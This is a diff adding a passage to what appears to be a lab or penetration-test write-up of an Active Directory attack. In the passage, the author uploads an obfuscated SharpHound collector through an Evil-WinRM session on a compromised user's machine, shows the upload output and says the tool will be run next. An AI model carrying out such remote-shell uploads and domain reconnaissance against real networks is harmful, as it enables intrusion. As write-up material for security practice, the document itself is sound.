@@ -1178,6 +1178,20 @@ So now it is returning some rights over the senior dev ops OU
 
 Specifically it is `DeleteChild` and `WriteProperty`
 
+It may be a good idea to re-collect bloodhound data now
+
+So ill upload sharphound
+
+```python
+*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> upload SharpHound.exe._obf.exe
+                                        
+Info: Uploading /home/kali/hsm/novacart/SharpHound.exe._obf.exe to C:\Users\cliff.b\Task Scripts\SharpHound.exe._obf.exe
+                                        
+Data: 979624 bytes of 979624 bytes copied
+                                        
+Info: Upload successful!
+```
+Now its uploaded ill execute it!
 
 
 
